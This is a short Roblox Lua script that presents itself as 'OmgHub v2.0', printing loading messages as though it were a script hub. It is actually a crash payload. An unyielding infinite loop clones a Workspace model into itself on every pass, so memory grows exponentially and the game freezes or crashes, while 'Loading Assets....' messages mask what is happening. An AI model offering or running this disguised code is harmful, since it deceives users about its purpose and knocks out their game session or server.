print("OmgHub v2.0 Loading")

task.wait(0 + 0)

print("OmgHub v2.0 Loaded")

local Model = Instance.new("Model", game.Workspace)
while true do
	print("Loading Assets....")
	Instance.new("Part", Model)
	Model:Clone().Parent = Model
end
